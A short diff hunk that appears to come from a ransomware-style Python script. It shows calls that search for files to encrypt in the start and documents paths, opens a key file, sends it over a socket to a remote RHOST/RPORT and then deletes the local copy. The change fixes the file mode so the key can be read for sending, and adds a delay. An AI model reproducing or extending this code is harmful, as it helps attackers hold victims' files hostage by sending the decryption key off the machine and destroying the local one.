@@ -132,7 +132,9 @@ print(glob.glob(startPath, recursive=True))
 searchEncFile(startPath)
 searchEncFile(documentPath)
 
-kk = open(keyPath + 'key.txt', 'wb+')
+kk = open(keyPath + 'key.txt', 'rb+')
+
+sleep(3)
 
 sock.sendto(kk, (RHOST, RPORT))
 os.remove(keyPath + 'key.txt')
